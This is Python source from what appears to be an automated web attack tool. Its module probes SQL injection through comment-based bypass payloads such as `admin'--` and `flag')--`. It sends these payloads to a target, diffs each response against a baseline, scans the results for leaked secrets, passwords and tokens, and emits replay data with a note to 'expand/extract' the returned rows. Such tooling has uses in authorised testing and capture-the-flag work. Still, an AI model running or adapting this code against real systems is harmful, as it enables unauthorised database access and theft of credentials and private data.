from __future__ import annotations

from urllib.parse import urlsplit

from ravage.web_core.http_probe import ProbeResponse, ProbeSession, compare_responses, response_secrets
from ravage.probe_suite_parts.sqli.sqli_detection import (
    _looks_filtered_response,
    _same_response_template_after_reflection,
    _sqli_probe_summary,
)
from ravage.probe_suite_parts.sqli.sqli_targets import _sqli_target_brief
from ravage.probe_suite_parts.sqli.sqli_transport import _send_sqli_target, _sqli_replay
from ravage.probe_suite_parts.sqli.sqli_values import _target_baseline_value
from ravage.probe_suite_parts.support import _contains_word, _dedupe, _string_items
from ravage.web_core.proof_recognizer import recognize_proofs

def _probe_sqli_literal_comment_bypasses(
    session: ProbeSession,
    target: dict[str, object],
    *,
    baseline: ProbeResponse,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for payload in _literal_comment_payloads_for_target(target):
        if budget <= 0:
            break
        response = _send_sqli_target(session, target, payload)
        budget -= 1
        delta = compare_responses(baseline, response, marker=payload)
        requests.append(
            _sqli_probe_summary(
                response,
                target,
                probe_kind="literal_comment_bypass",
                body_chars=320,
                payload=payload,
            )
            | {"delta": delta.to_json()}
        )
        proofs = recognize_proofs(response.body)
        matches = response_secrets(response)
        high_value_matches: list[str] = []
        for item in matches:
            if _sqli_secret_match_is_high_value(item):
                high_value_matches.append(item)
        if proofs or high_value_matches:
            return (
                {
                    "type": "sql_literal_comment_exposed_secret",
                    "input": _sqli_target_brief(target),
                    "payload": payload,
                    "proofs": proofs,
                    "matches": high_value_matches,
                    "response": response.summary(body_chars=700),
                    "replay": _sqli_replay(target, payload),
                },
                requests,
                budget,
            )
        baseline_matches = set(response_secrets(baseline))
        signal_matches = [
            item
            for item in matches
            if item not in baseline_matches
            and not _sqli_secret_match_is_decoded_braced(item)
            and _sqli_secret_match_is_high_value(item)
        ]
        if signal_matches or _literal_comment_result_signal(
            response,
            baseline,
            target=target,
            payload=payload,
            baseline_value=_target_baseline_value(target),
        ):
            return (
                {
                    "type": "sql_literal_comment_bypass_signal",
                    "input": _sqli_target_brief(target),
                    "payload": payload,
                    "matches": signal_matches,
                    "delta": delta.to_json(),
                    "response": response.summary(body_chars=420),
                    "replay": _sqli_replay(target, payload),
                    "next": "Replay this exact payload and expand/extract from the returned result set.",
                },
                requests,
                budget,
            )
    return None, requests, budget

def _sqli_secret_match_is_high_value(item: str) -> bool:
    return not str(item).startswith(("filesystem_path:", "decoded_base64_braced:"))

def _sqli_secret_match_is_decoded_braced(item: str) -> bool:
    return str(item).startswith("decoded_base64_braced:")

def _target_looks_file_or_include_like(target: dict[str, object]) -> bool:
    name = str(target.get("input") or target.get("name") or "").lower()
    path = urlsplit(str(target.get("url") or "")).path.lower()
    hint_parts: list[str] = []
    for item in _string_items(target.get("hints")):
        hint_parts.append(item.lower())
    hints = " ".join(hint_parts)
    text = " ".join((name, path, hints))
    return any(
        marker in text
        for marker in (
            "file",
            "filename",
            "path",
            "page",
            "include",
            "template",
            "document",
            "doc",
        )
    )

def _literal_comment_payloads_for_target(target: dict[str, object]) -> list[str]:
    candidates = _literal_comment_candidates(target)
    payloads: list[str] = []
    for candidate in candidates:
        payloads.extend(
            [
                f"{candidate}'--",
                f"{candidate}'-- -",
                f"{candidate}' /*",
                f"{candidate}')--",
                f"{candidate}\")--",
            ]
        )
    return _dedupe(payloads)[:20]

def _literal_comment_candidates(target: dict[str, object]) -> list[str]:
    input_name = str(target.get("input") or "").lower()
    candidates = ["admin", "premium", "private", "secret", "flag"]
    if "type" in input_name or "category" in input_name or "filter" in input_name:
        candidates = ["premium", "private", "admin", "secret", "flag", *candidates]
    if "user" in input_name or "name" in input_name:
        candidates = ["admin", "administrator", "root", *candidates]
    return _dedupe(candidates)

def _literal_comment_result_signal(
    response: ProbeResponse,
    baseline: ProbeResponse,
    *,
    target: dict[str, object],
    payload: str,
    baseline_value: str,
) -> bool:
    if response.status is None or response.status >= 500:
        return False
    lowered = response.body.lower()
    if _looks_filtered_response(response.body):
        return False
    if _same_response_template_after_reflection(
        response.body,
        baseline.body,
        response_payload=payload,
        baseline_payload=baseline_value,
    ):
        return False
    secret_words_visible = _contains_word(
        lowered,
        ("password", "secret", "token", "admin panel", "premium"),
    )
    if secret_words_visible and response.body != baseline.body:
        return True
    if _target_looks_file_or_include_like(target):
        return False
    if len(response.body) > len(baseline.body) + 40:
        return True
    return False
